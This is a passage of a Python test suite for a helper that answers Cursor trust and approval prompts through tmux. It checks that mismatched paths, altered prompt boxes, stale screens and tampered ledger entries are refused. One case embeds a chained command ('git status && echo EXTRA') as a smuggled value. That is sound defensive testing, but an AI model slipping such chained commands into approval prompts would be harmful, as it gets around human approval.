                for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
                    path.unlink()
                self.screen(TRUST_SCREEN)
                self.env.pop("FAKE_PID", None)
                self.env["FAKE_PID"] = "123"
                inspected = self.start_and_inspect()
                args = self.namespace(inspected["receipt"])
                original_spend = helper.spend_approval

                def spend_then_change(path, entry):
                    original_spend(path, entry)
                    if "capture" in change:
                        self.capture.write_text(self.fix(change["capture"]))
                    for key, value in change.get("env", {}).items():
                        os.environ[key] = value

                with mock.patch.dict(os.environ, self.env), \
                        mock.patch.object(helper, "spend_approval", spend_then_change):
                    with self.assertRaises(helper.Refusal) as caught:
                        helper.answer_session(args)
                self.assertEqual((caught.exception.state, caught.exception.code), ("prompt-changed", 2))
                self.assertEqual(self.sends(), [])
                self.assertEqual(json.loads(self.ledger().read_text())["outcome"], "not-sent")
                self.assertEqual(self.state()["answers"][-1]["outcome"], "not-sent")
                self.assertEqual(self.state()["receipt_id"], "")
        # The approval stays spent: a new receipt does not allow a second try.
        self.screen(TRUST_SCREEN)
        newer = self.inspect_now()
        code, spent = self.invoke("answer", self.answer_args(newer["receipt"]))
        self.assertEqual((code, spent["state"]), (2, "approval-spent"))
        self.assertEqual(self.sends(), [])

    def test_byte_truncated_visible_screen_is_refused(self):
        # QA round 1 (SK3), surviving mutant M10: the 8192-byte cap cuts into the
        # first visible row when the capture has exactly pane_height rows.
        capture = "x" * 9000 + "\n" + TRUST_SCREEN
        self.screen(capture)
        inspected = self.start_and_inspect()
        self.assertTrue(inspected["truncated"])
        code, refused = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
        self.assertEqual(self.sends(), [])

    # Trust path binding (QA round 2, LOW 4, release-blocking for the G1 use):
    # the approval covers one directory, so the answer must name exactly that one.

    def box_row(self, text):
        return "  \u2502    " + text + "                      \u2502\n"

    def case_approval(self, label):
        """One approval per subcase, so a key sent in one case cannot mask the next."""
        return "OP399-case-" + __import__("hashlib").sha256(label.encode("utf-8")).hexdigest()[:16]

    def trust_screen(self, path_rows):
        """The trust screen with its path row replaced by `path_rows`."""
        screen = self.fix(TRUST_SCREEN)
        if self.fix(TRUST_PATH_ROW) not in screen:
            raise AssertionError("the trust screen has no path row to replace")
        return screen.replace(self.fix(TRUST_PATH_ROW), path_rows)

    def test_trust_path_must_be_the_recorded_worktree(self):
        inspected = self.start_and_inspect()
        sibling = self.repo.parent / "other-task"
        sibling.mkdir()
        expect = self.root / "expect-sibling"
        expect.write_text(self.fix(TRUST_EXPECT).replace(self.worktree, str(sibling)))
        self.log.write_text("")
        code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], expect=expect,
                                                                trust=str(sibling)))
        self.assertEqual((code, refused["state"]), (2, "trust-path-mismatch"))
        # Checked against the start record under the lock, before any tmux call.
        self.assertEqual(self.commands("tmux"), [])
        self.assertFalse(self.ledger().exists())
        self.assertNotEqual(self.state()["receipt_id"], "")

    def test_trust_path_input_is_checked_before_any_tmux_call(self):
        self.start_and_inspect()
        no_path = self.root / "expect-no-path"
        # QA's case: the question and the choice, but not the path.
        no_path.write_text("Workspace Trust Required\nDo you trust the contents of this directory?\n"
                           "[a] Trust this workspace\n")
        longer = self.root / "expect-longer-word"
        longer.write_text(self.fix(TRUST_EXPECT).replace(self.worktree, self.worktree + "-old"))
        permission = self.root / "expect-permission"
        permission.write_text("Permission required to continue [a] Allow\n" + self.worktree + "\n")
        parent = str(self.repo.parent)
        cases = {
            "a trust answer without --trust-path": {"trust": None},
            "--trust-path on a permission answer": {"kind": "modal-permission", "expect": permission,
                                                    "trust": self.worktree},
            "relative": {"trust": self.worktree.lstrip("/")},
            "a dot-dot component": {"trust": self.worktree + "/../example-task"},
            "a dot component": {"trust": parent + "/./example-task"},
            "a trailing slash": {"trust": self.worktree + "/"},
            "a double slash": {"trust": parent + "//example-task"},
            "a space": {"trust": parent + "/example task"},
            "home-relative": {"trust": "~/example-task"},
            "oversize": {"trust": "/" + "a" * 1024},
            "expected text without the path": {"expect": no_path},
            "expected text with the path inside a longer word": {"expect": longer},
        }
        for label, options in cases.items():
            with self.subTest(label=label):
                receipt = self.inspect_now()["receipt"]
                trust = options.get("trust")
                if "expect" not in options and trust and " " not in trust:
                    # The expected text names the same path, so only the path rule can refuse it.
                    named = self.root / "expect-named"
                    named.write_text(self.fix(TRUST_EXPECT).replace(self.worktree, trust))
                    options = dict(options, expect=named)
                self.log.write_text("")
                approval = self.case_approval(label)
                code, refused = self.invoke("answer", self.answer_args(receipt, approval=approval, **options))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])
                self.assertFalse(self.ledger(approval).exists())
                self.assertEqual(self.state()["receipt_id"], helper.parse_receipt(receipt)["id"])

    def test_trust_prompt_must_name_exactly_the_trust_path(self):
        path = self.worktree
        middle = len(path) // 2
        older = self.box_row(path)
        cases = {
            "another path": (self.box_row(str(self.repo.parent / "other-task")), "trust-path-mismatch"),
            "the parent directory": (self.box_row(str(self.repo.parent)), "trust-path-mismatch"),
            "a longer name that starts with the path": (self.box_row(path + "-old"), "trust-path-mismatch"),
            "a child directory": (self.box_row(path + "/nested"), "trust-path-mismatch"),
            "a path that ends with the path": (self.box_row("/private" + path), "trust-path-mismatch"),
            "a trailing slash": (self.box_row(path + "/"), "trust-path-mismatch"),
            "attached punctuation": (self.box_row(path + "?"), "trust-path-mismatch"),
            "a home-relative form": (self.box_row("~/example-task"), "trust-path-mismatch"),
            "the home directory as ~": (self.box_row("~"), "trust-path-mismatch"),
            "a shortened form": (self.box_row(path[:-4] + "\u2026"), "trust-path-mismatch"),
            "a second path in the prompt": (self.box_row(path) + self.box_row("Parent: /tmp"), "trust-path-mismatch"),
            "a URL in the prompt": (self.box_row(path) + self.box_row("Docs: https://cursor.com/docs"),
                                    "trust-path-mismatch"),
            "split across two box rows": (self.box_row(path[:middle]) + self.box_row(path[middle:]),
                                          "trust-path-mismatch"),
            # tmux prints a wrapped line as separate rows, so a path at a row edge may continue.
            "wrapped: the path ends its row and the next row continues it": (
                "  \u2502    " + path + "\n" + "-old                      \u2502\n", "trust-path-unclear"),
            "wrapped: the path starts its row after the row above": (
                "  \u2502    see\n" + path + "                      \u2502\n", "trust-path-unclear"),
            "no path shown": ("", "trust-path-missing"),
        }
        for label, (rows, expected) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(self.trust_screen(rows))
                inspected = self.start_and_inspect()
                self.assertEqual(inspected["classification"], "modal-trust")
                approval = self.case_approval(label)
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], approval=approval))
                self.assertEqual((code, refused["state"]), (2, expected))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())
        with self.subTest(label="the path only in older rows"):
            self.restart_case()
            visible = self.trust_screen("")
            self.screen(older + visible, visible=len(visible.splitlines()))
            inspected = self.start_and_inspect()
            approval = self.case_approval("the path only in older rows")
            code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], approval=approval))
            self.assertEqual((code, refused["state"]), (2, "trust-path-missing"))
            self.assertEqual(self.sends(), [])
            self.assertFalse(self.ledger(approval).exists())

    def test_trust_path_between_box_borders_is_named(self):
        # Characterization: box-drawing characters separate words like spaces do.
        self.screen(self.trust_screen("  \u2502" + self.worktree + "\u2502\n"))
        inspected = self.start_and_inspect()
        code, answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, answered["state"]), (0, "answered"))

    # Visible-screen location (QA rounds 1 and 2, LOW 3).

    def test_history_size_change_since_inspect_is_stale(self):
        inspected = self.start_and_inspect()
        self.env["FAKE_HISTORY"] = "5"
        code, stale = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.assertEqual(self.sends(), [])

    def test_inexact_history_size_is_refused(self):
        code, _started = self.invoke("start")
        self.assertEqual(code, 0)
        for value in ("x", "-1", "3 "):
            with self.subTest(value=value):
                code, refused = self.invoke("inspect", env={"FAKE_HISTORY": value})
                self.assertEqual((code, refused["state"]), (3, "inspect-unconfirmed"))

    def test_capture_row_count_must_match_tmux_history_and_height(self):
        # If tmux dropped blank rows, the last pane_height rows would reach up into
        # history and an old prompt there could look current. The count catches it.
        rows = len(TRUST_SCREEN.splitlines())
        older = "older output\n" * 3
        cases = {
            "the blank rows below the prompt were dropped": (older + TRUST_CAPTURE, 3),
            "the prompt is in history and the blank screen was dropped": (
                older + TRUST_CAPTURE, 3 + len(TRUST_CAPTURE.splitlines())),
        }
        for label, (capture, history) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=rows, history=history)
                inspected = self.start_and_inspect()
                approval = self.case_approval(label)
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], approval=approval))
                self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.ledger(approval).exists())

    def test_history_beyond_the_requested_rows_counts_as_80(self):
        # Characterization: it passes before and after the count check. tmux clamps
        # -S -80 to 80 history rows, so a longer history still locates the screen.
        capture = "older output\n" * 80 + TRUST_SCREEN
        self.screen(capture, visible=len(TRUST_SCREEN.splitlines()), history=500)
        inspected = self.start_and_inspect()
        self.assertTrue(inspected["truncated"])
        code, answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, answered["state"]), (0, "answered"))

    # Exact prompt rows (QA on main ece3e83d: an expected line was a case-folded
    # substring of one row, so a longer or differently cased target was answered).

    def test_expected_lines_must_be_the_exact_prompt_rows(self):
        path = self.worktree
        upper = str(self.repo.parent / "Example-Task")
        cat = "Allow this command: cat " + path
        trust_rows = self.fix(TRUST_EXPECT).splitlines(True)

        def approval(first_row, extra_rows=""):
            return APPROVAL_SCREEN.replace("Allow this command: git status  ", first_row + "  ", 1).replace(
                "  \u2502  \u25b6 [y] Yes", extra_rows + "  \u2502  \u25b6 [y] Yes", 1)

        def expect_cat(rows=None):
            return (rows or cat) + "\n\u25b6 [y] Yes\n[n] No\n"

        trust, ok = "modal-trust", "answered"
        cases = {
            # Positive controls.
            "exact approval prompt": ("modal-approval", APPROVAL_SCREEN, APPROVAL_EXPECT, "y", ok),
            "trailing whitespace on the shown row": (
                "modal-approval", APPROVAL_SCREEN.replace("git status              \u2502", "git status   "),
                APPROVAL_EXPECT, "y", ok),
            "trailing whitespace in the expected text": (
                "modal-approval", APPROVAL_SCREEN, APPROVAL_EXPECT.replace("git status\n", "git status   \n"), "y", ok),
            "the expected text copied with its border": (
                "modal-approval", APPROVAL_SCREEN,
                "".join(row + "\n" for row in APPROVAL_CAPTURE.splitlines()[2:5]), "y", ok),
            # QA's three cases.
            "QA 1: the path with a suffix": (
                trust, self.trust_screen(self.box_row(path + "-extra")), TRUST_EXPECT, "a", "trust-path-mismatch"),
            "QA 2: the path in another case": (
                trust, self.trust_screen(self.box_row(upper)), TRUST_EXPECT, "a", "trust-path-mismatch"),
            "QA 3: a longer command": (
                "modal-approval", approval("Allow this command: git status && echo EXTRA"), APPROVAL_EXPECT, "y",
                "modal-mismatch"),
            # The same targets where only the row rule applies.
            "an approval path target with a suffix": (
                "modal-approval", approval(cat + "-extra"), expect_cat(), "y", "modal-mismatch"),
            "an approval path target in another case": (
                "modal-approval", approval("Allow this command: cat " + upper), expect_cat(), "y", "modal-mismatch"),
            "the prompt text in another case": (
                "modal-approval", approval("Allow This Command: git status"), APPROVAL_EXPECT, "y", "modal-mismatch"),
            "a doubled space inside the row": (
                "modal-approval", approval("Allow this command: git  status"), APPROVAL_EXPECT, "y", "modal-mismatch"),
            "a wrapped continuation row": (
                "modal-approval", approval("Allow this command: git status",
                                           "  \u2502  && echo EXTRA                               \u2502\n"),
                APPROVAL_EXPECT, "y", "modal-mismatch"),
            "a wrapped long path": (
                "modal-approval", approval(cat[:-4], "  \u2502  " + cat[-4:] + "                \u2502\n"),
                expect_cat(), "y", "modal-mismatch"),
            "the first prompt row left out": (trust, TRUST_SCREEN, "".join(trust_rows[1:]), "a", "modal-mismatch"),
            "a middle prompt row left out": (
                trust, TRUST_SCREEN, "".join(trust_rows[:1] + trust_rows[2:]), "a", "modal-mismatch"),
            "the last prompt row left out": (trust, TRUST_SCREEN, "".join(trust_rows[:-1]), "a", "modal-mismatch"),
            "a later prompt row with a longer target": (
                "modal-approval", APPROVAL_SCREEN.replace("[y] Yes      ", "[y] Yes, always"), APPROVAL_EXPECT, "y",
                "modal-mismatch"),
            "a later prompt row in another case": (
                "modal-approval", APPROVAL_SCREEN.replace("[n] No", "[n] NO"), APPROVAL_EXPECT, "y", "modal-mismatch"),
            "the exact prompt only in history, another one visible": (
                "modal-approval", APPROVAL_CAPTURE + approval("Allow this command: git push"), APPROVAL_EXPECT, "y",
                "stale-prompt", len(APPROVAL_SCREEN.splitlines())),
            "the prompt shown twice": (
                "modal-approval", APPROVAL_CAPTURE + APPROVAL_SCREEN, APPROVAL_EXPECT, "y", "prompt-unclear"),
            "the prompt on the first visible row": (
                "modal-approval", "Allow this command: git status\n\u25b6 [y] Yes\n[n] No\n\n", APPROVAL_EXPECT, "y",
                "prompt-unclear"),
            "the prompt on the last visible row": (
                "modal-approval", "\nAllow this command: git status\n\u25b6 [y] Yes\n[n] No", APPROVAL_EXPECT, "y",
                "prompt-unclear"),
        }
        for label, (kind, capture, text, choice, expected, *visible) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible[0] if visible else None)
                inspected = self.start_and_inspect()
                expect = self.root / "expect-rows"
                expect.write_text(self.fix(text))
                approval_ref = self.case_approval(label)
                code, result = self.invoke("answer", self.answer_args(inspected["receipt"], choice=choice, kind=kind,
                                                                      approval=approval_ref, expect=expect))
                if expected == ok:
                    self.assertEqual((code, result["state"]), (0, "answered"))
                    self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", choice]])
                else:
                    self.assertEqual((code, result["state"]), (2, expected))
                    self.assertEqual(self.sends(), [])
                    self.assertFalse(self.ledger(approval_ref).exists())

    # The whole box (QA round 3, HIGH): the real trust box has a padding row between
    # its rows, so the rows next to the expected block are always blank.

    def test_the_expected_text_is_the_whole_box(self):
        rows = self.fix(TRUST_EXPECT).splitlines(True)
        trust, approval, ok = "modal-trust", "modal-approval", "answered"
        top_cut = len(TRUST_SCREEN.splitlines()) - 3
        unboxed = "Allow this command: git status\n\u25b6 [y] Yes\n[n] No\n"
        cases = {
            "the full prompt": (trust, TRUST_SCREEN, TRUST_EXPECT, "a", ok, None),
            "a square-cornered box": (
                approval, "\n" + boxed(["  Allow this command: git status", "  \u25b6 [y] Yes", "    [n] No"],
                                       "\u250c", "\u2510", "\u2514", "\u2518") + "\n", APPROVAL_EXPECT, "y", ok, None),
            "the header left out": (trust, TRUST_SCREEN, "".join(rows[1:]), "a", "modal-mismatch", None),
            "the footer left out": (trust, TRUST_SCREEN, "".join(rows[:-1]), "a", "modal-mismatch", None),
            "only the question to the choices": (trust, TRUST_SCREEN, "".join(rows[2:6]), "a", "modal-mismatch", None),
            "an unexpected row after a padding row": (
                trust, TRUST_TIP + boxed(TRUST_BOX_ROWS + ["  Also trusts every parent directory.", ""]) + "\n\n",
                TRUST_EXPECT, "a", "modal-mismatch", None),
            "a changed header, left out of the expected text": (
                trust, TRUST_SCREEN.replace("Required" + " " * 46, "Required for this and every parent directory  "),
                "".join(rows[1:]), "a", "modal-mismatch", None),
            "the top border above the visible screen": (trust, TRUST_SCREEN, TRUST_EXPECT, "a", "prompt-unclear", top_cut),
            "no bottom border": (
                trust, TRUST_TIP + boxed(TRUST_BOX_ROWS).rsplit("  \u2570", 1)[0] + "\n\n", TRUST_EXPECT, "a",
                "prompt-unclear", None),
            "an unboxed prompt between blank rows": (approval, "\n" + unboxed + "\n", APPROVAL_EXPECT, "y",
                                                     "prompt-unclear", None),
            "another box's bottom border above the prompt": (
                approval, boxed(["  Tip"]) + "\n" + unboxed + "\n" + "  \u2570" + "\u2500" * 4 + "\u256f\n\n",
                APPROVAL_EXPECT, "y", "prompt-unclear", None),
            "another box's top border below the prompt": (
                approval, "  \u256d" + "\u2500" * 4 + "\u256e\n\n" + unboxed + "\n" + boxed(["  Other"]) + "\n",
                APPROVAL_EXPECT, "y", "prompt-unclear", None),
        }
        for label, (kind, capture, text, choice, expected, visible) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible)
                inspected = self.start_and_inspect()
                expect = self.root / "expect-box"
                expect.write_text(self.fix(text))
                approval_ref = self.case_approval(label)
                code, result = self.invoke("answer", self.answer_args(inspected["receipt"], choice=choice, kind=kind,
                                                                      approval=approval_ref, expect=expect))
                if expected == ok:
                    self.assertEqual((code, result["state"]), (0, "answered"))
                    self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", choice]])
                else:
                    self.assertEqual((code, result["state"]), (2, expected))
                    self.assertEqual(self.sends(), [])
                    self.assertFalse(self.ledger(approval_ref).exists())

    # Nested and paired boxes (QA round 4, MEDIUM): the nearest top and bottom
    # borders can belong to different boxes, leaving rows of an outer box unchecked.

    def test_the_prompt_binds_to_one_paired_box(self):
        def inner(rows, width=44):
            return (["  \u256d" + "\u2500" * width + "\u256e"]
                    + ["  \u2502" + row.ljust(width) + "\u2502" for row in rows]
                    + ["  \u2570" + "\u2500" * width + "\u256f"])

        command, options = "  Allow this command: git status", ["  \u25b6 [y] Yes", "    [n] No"]
        header = "  Allow this command to modify files outside the workspace?"
        approval_box = boxed([command] + options)
        nested_a = boxed(["", header, ""] + inner([command]) + [""] + options + [""])
        nested_b = boxed(["", command, ""] + inner(options) + ["", "  This also grants network access.", ""])
        nested_c = boxed(["", header, ""] + inner([command] + options) + [""])
        c_lines = nested_c.splitlines(True)
        frameless = ("\u256d" + "\u2500" * 76 + "\u256e\n" + header + "\n\n"
                     + "".join(row + "\n" for row in inner([command] + options)) + "\u2570" + "\u2500" * 76 + "\u256f\n")
        narrow_bottom = approval_box.rsplit("  \u2570", 1)[0] + "  \u2570" + "\u2500" * 70 + "\u256f\n"
        lone_top = "  \u256d" + "\u2500" * 20 + "\u256e\n"
        closed_above = "  \u2502  old output      \u2502\n  \u2570" + "\u2500" * 18 + "\u256f\n"
        everything = "Allow this command to modify files outside the workspace?\n" + APPROVAL_EXPECT
        a, ok = "modal-approval", "answered"
        cases = {
            "a separate box above the prompt's box": (a, boxed(["  Tip: one box"]) + "\n" + approval_box + "\n",
                                                      APPROVAL_EXPECT, ok, None),
            "QA: an outer header left out, the command in an inner box": (
                a, nested_a + "\n", APPROVAL_EXPECT, "prompt-unclear", None),
            "QA: an outer footer below an inner box holding the options": (
                a, nested_b + "\n", APPROVAL_EXPECT, "prompt-unclear", None),
            "the prompt inside an inner box, the outer header left out": (
                a, nested_c + "\n", APPROVAL_EXPECT, "prompt-unclear", None),
            "every row of both boxes expected": (a, nested_a + "\n", everything, "prompt-unclear", None),
            "an outer box whose borders are off the visible screen": (
                a, "".join(c_lines[:-1]), APPROVAL_EXPECT, "prompt-unclear", len(c_lines) - 2),
            "an outer frame without side borders": (a, frameless + "\n", APPROVAL_EXPECT, "prompt-unclear", None),
            "top and bottom borders of different widths": (a, narrow_bottom + "\n", APPROVAL_EXPECT, "prompt-unclear", None),
            "a box left open above the prompt's box": (a, lone_top + "\n" + approval_box + "\n", APPROVAL_EXPECT,
                                                       "prompt-unclear", None),
            "two boxes side by side on one border row": (
                a, "  \u256d\u2500\u2500\u256e  \u256d\u2500\u2500\u256e\n  \u2502a \u2502  \u2502b \u2502\n"
                   "  \u2570\u2500\u2500\u256f  \u2570\u2500\u2500\u256f\n\n" + approval_box + "\n",
                APPROVAL_EXPECT, "prompt-unclear", None),
            "a box closed above the prompt's box, its top off the screen": (
                a, closed_above + "\n" + approval_box + "\n", APPROVAL_EXPECT, "prompt-unclear", None),
        }
        for label, (kind, capture, text, expected, visible) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible)
                inspected = self.start_and_inspect()
                expect = self.root / "expect-nested"
                expect.write_text(text)
                approval_ref = self.case_approval(label)
                code, result = self.invoke("answer", self.answer_args(inspected["receipt"], choice="y", kind=kind,
                                                                      approval=approval_ref, expect=expect))
                if expected == ok:
                    self.assertEqual((code, result["state"]), (0, "answered"))
                    self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "y"]])
                else:
                    self.assertEqual((code, result["state"]), (2, expected))
                    self.assertEqual(self.sends(), [])
                    self.assertFalse(self.ledger(approval_ref).exists())

    # Titled borders (advisory on b8cabefd, MEDIUM): a border with a title, such as
    # "╭─ Note ─╮", counted as text, so a titled outer frame never paired.

    def test_titled_borders_pair_like_any_border(self):
        def titled(left, right, title, width, indent=""):
            return indent + left + "\u2500 " + title + " " + "\u2500" * (width - len(title) - 3) + right

        def inner(rows, width=44, top=None, bottom=None):
            return ([top or "  \u256d" + "\u2500" * width + "\u256e"]
                    + ["  \u2502" + row.ljust(width) + "\u2502" for row in rows]
                    + [bottom or "  \u2570" + "\u2500" * width + "\u256f"])

        command, options = "  Allow this command: git status", ["  \u25b6 [y] Yes", "    [n] No"]
        header = "  Allow this command to modify files outside the workspace?"
        approval_box = boxed([command] + options)
        frame_top, frame_bottom = titled("\u256d", "\u256e", "Note", 76), titled("\u2570", "\u256f", "esc", 76)
        plain_top, plain_bottom = "\u256d" + "\u2500" * 76 + "\u256e", "\u2570" + "\u2500" * 76 + "\u256f"
        body = header + "\n\n" + "".join(row + "\n" for row in inner([command] + options))

        def frame(top, bottom):
            return top + "\n" + body + bottom + "\n\n"

        inner_titled = inner([command], top=titled("\u256d", "\u256e", "Command", 44, "  "),
                             bottom=titled("\u2570", "\u256f", "esc", 44, "  "))
        nested_titled = boxed(["", header, ""] + inner_titled + [""] + options + [""])
        all_rows = header.strip() + "\nCommand\n" + command.strip() + "\nesc\n" + "\n".join(o.strip() for o in options) + "\n"
        own_titled_top = ("  " + titled("\u256d", "\u256e", "Approval", BOX_WIDTH) + "\n"
                          + approval_box.split("\n", 1)[1])
        own_titled_both = own_titled_top.rsplit("  \u2570", 1)[0] + "  " + titled("\u2570", "\u256f", "esc", BOX_WIDTH) + "\n"
        own_titled_bottom = approval_box.rsplit("  \u2570", 1)[0] + "  " + titled("\u2570", "\u256f", "esc", BOX_WIDTH) + "\n"
        tip_box = ("  " + titled("\u256d", "\u256e", "Tip", BOX_WIDTH) + "\n  \u2502" + "  one titled box".ljust(BOX_WIDTH)
                   + "\u2502\n  \u2570" + "\u2500" * BOX_WIDTH + "\u256f\n")
        a, ok = "modal-approval", "answered"
        cases = {
            # Positive controls.
            "a titled box above the prompt's box": (tip_box + "\n" + approval_box + "\n", APPROVAL_EXPECT, ok),
            "a tree row above the prompt's box": ("\u2514\u2500\u2500 foo\n\n" + approval_box + "\n", APPROVAL_EXPECT, ok),
            # Titled outer frames without side borders, around an inner box holding the prompt.
            "QA: a titled outer frame, top and bottom": (frame(frame_top, frame_bottom), APPROVAL_EXPECT, "prompt-unclear"),
            "a titled outer frame, top only": (frame(frame_top, plain_bottom), APPROVAL_EXPECT, "prompt-unclear"),
            "a titled outer frame, bottom only": (frame(plain_top, frame_bottom), APPROVAL_EXPECT, "prompt-unclear"),
            # A titled inner box inside the prompt's box, every row expected.
            "a titled inner box, every row expected": (nested_titled + "\n", all_rows, "prompt-unclear"),
            # The prompt's own box with a title.
            "the prompt's own box has a titled top": (own_titled_top + "\n", APPROVAL_EXPECT, "prompt-unclear"),
            "the prompt's own box has a titled top and bottom": (own_titled_both + "\n", APPROVAL_EXPECT, "prompt-unclear"),
            "the prompt's own box has a titled bottom": (own_titled_bottom + "\n", APPROVAL_EXPECT, "prompt-unclear"),
        }
        for label, (capture, text, expected) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture)
                inspected = self.start_and_inspect()
                expect = self.root / "expect-titled"
                expect.write_text(text)
                approval_ref = self.case_approval(label)
                code, result = self.invoke("answer", self.answer_args(inspected["receipt"], choice="y", kind=a,
                                                                      approval=approval_ref, expect=expect))
                if expected == ok:
                    self.assertEqual((code, result["state"]), (0, "answered"))
                    self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "y"]])
                else:
                    self.assertEqual((code, result["state"]), (2, expected))
                    self.assertEqual(self.sends(), [])
                    self.assertFalse(self.ledger(approval_ref).exists())

    # An answered trust box (OP399 SK3, 2026-11-05). inspect and reply do not count a
    # visible trust box only when this pane's ledger holds the sent answer and the box
    # is that prompt, plus one status row and minus the selection marker.

    def answer_then_show(self, screen, approval=APPROVAL, history=11, cursor=None, mode="", visible=None):
        self.screen(TRUST_SCREEN)
        inspected = self.start_and_inspect()
        code, answered = self.invoke("answer", self.answer_args(inspected["receipt"], approval=approval), mode=mode)
        self.assertEqual(code, 3 if mode == "send-fail" else 0, answered)
        rows = len(screen.splitlines()) if visible is None else visible
        self.screen("older output\n" * history + screen, visible=rows, cursor=cursor)
        return self.inspect_now()

    def assert_refused(self, after, kind):
        self.assertEqual(after["classification"], kind)
        before = len(self.sends())
        code, refused = self.reply_to(after["receipt"], "--submit", "--observed-ready")
        self.assertEqual((code, refused["state"]), (2, kind))
        self.assertEqual(len(self.sends()), before)

    def edit_ledger(self, approval, change):
        entry = json.loads(self.ledger(approval).read_text())
        self.ledger(approval).write_text(json.dumps(change(entry)))

    def test_answer_records_box_evidence_without_prompt_text(self):
        self.answer_then_show(ANSWERED_SCREEN)
        entry, record = json.loads(self.ledger().read_text()), self.state()["answers"][-1]
        self.assertEqual({key: entry[key] for key in ("format", "worktree", "trust_path", "box_marker_rows", "outcome")},
                         {"format": 2, "worktree": self.worktree, "trust_path": self.worktree,
                          "box_marker_rows": [4], "outcome": "sent"})
        self.assertRegex(entry["box_rows_sha256"], r"^[0-9a-f]{64}$")
        self.assertEqual({key: record[key] for key in ("format", "worktree", "box_rows_sha256", "box_marker_rows")},
                         {key: entry[key] for key in ("format", "worktree", "box_rows_sha256", "box_marker_rows")})
        for text in ("Trust this workspace", "Do you trust", "Quit"):
            self.assertNotIn(text, self.ledger().read_text())

    def test_answered_trust_box_does_not_block_a_reply(self):
        cases = {
            "Cursor's composer: unclassified, needs --observed-ready": (ANSWERED_SCREEN, "unclassified"),
            "no history": (ANSWERED_SCREEN, "unclassified", 0),
            "the box top in history": (ANSWERED_SCREEN, "unclassified", 11, 20),
        }
        for label, (screen, kind, *split) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                approval = self.case_approval(label)
                history, visible = (split + [11, None])[0], (split[1:] + [None])[0]
                after = self.answer_then_show(screen, approval=approval, history=history, visible=visible)
                self.assertEqual(after["classification"], kind)
                self.assertIn(approval, after["classification_detail"])
                flags = ("--submit",)
                if kind == "unclassified":
                    code, refused = self.reply_to(after["receipt"], "--submit")
                    self.assertEqual((code, refused["state"]), (2, "unclassified-ui"))
                    flags += ("--observed-ready",)
                code, sent = self.reply_to(after["receipt"], *flags)
                self.assertEqual((code, sent["state"], sent["classification"]), (0, "sent", kind))
                self.assertEqual(self.sends()[-2:], [["send-keys", "-t", "%7", "-l", "--", "continue"],
                                                     ["send-keys", "-t", "%7", "Enter"]])

    def test_answered_box_needs_this_panes_sent_ledger_entry(self):
        old_format = lambda entry: {key: entry[key] for key in OLD_LEDGER_FIELDS}
        edits = {
            "another pane": lambda entry: dict(entry, pane_id="%8"),
            "another pid": lambda entry: dict(entry, pane_pid="999"),
            "another owner": lambda entry: dict(entry, owner="ci1-" + "0" * 32),
            "another worktree": lambda entry: dict(entry, worktree=str(self.root / "other-task")),
            "another trust path": lambda entry: dict(entry, trust_path=str(self.root / "other-task")),
            "another task name": lambda entry: dict(entry, name="task-unique-2"),
            "another kind": lambda entry: dict(entry, kind="modal-approval"),
            "an outcome other than sent": lambda entry: dict(entry, outcome="uncertain"),
            "an older ledger format": lambda entry: dict(entry, format=1),
            "the pre-format-2 fields only": old_format,
            "a malformed box hash": lambda entry: dict(entry, box_rows_sha256="0" * 63),
            "a ledger answer the state record does not show": lambda entry: dict(entry, answered_at="2026-11-05T00:00:00Z"),
        }
        for label, change in edits.items():
            with self.subTest(label=label):
                self.restart_case()
                approval = self.case_approval(label)
                self.answer_then_show(ANSWERED_SCREEN, approval=approval)
                self.edit_ledger(approval, change)
                self.assert_refused(self.inspect_now(), "modal-trust")
        with self.subTest(label="the old fields in both the ledger and the state record"):
            self.restart_case()
            approval = self.case_approval("old fields in both")
            self.answer_then_show(ANSWERED_SCREEN, approval=approval)
            self.edit_ledger(approval, old_format)
            path = self.root / "state" / "cursor-interactive-session" / self.name
            state = self.state()
            state["answers"][-1] = {key: value for key, value in state["answers"][-1].items() if key in OLD_LEDGER_FIELDS}
            path.write_text(json.dumps(state))
            self.assert_refused(self.inspect_now(), "modal-trust")
        for label in ("no ledger entry", "an unreadable ledger entry", "a key that may not have landed"):
            with self.subTest(label=label):
                self.restart_case()
                approval = self.case_approval(label)
                if label == "no ledger entry":
                    self.screen("older output\n" * 11 + ANSWERED_SCREEN, visible=24)
                    after = self.start_and_inspect()
                elif label == "an unreadable ledger entry":
                    self.answer_then_show(ANSWERED_SCREEN, approval=approval)
                    self.ledger(approval).write_bytes(b"{not json")
                    after = self.inspect_now()
                else:
                    after = self.answer_then_show(ANSWERED_SCREEN, approval=approval, mode="send-fail")
                self.assert_refused(after, "modal-trust")

    def test_answered_box_must_be_the_answered_rows(self):
        def box_with(rows):
            return ANSWERED_SCREEN.replace(boxed(ANSWERED_BOX_ROWS), boxed(rows))

        moved = [row.replace("    [q] Quit", "  \u25b6 [q] Quit") for row in ANSWERED_BOX_ROWS]
        cases = {
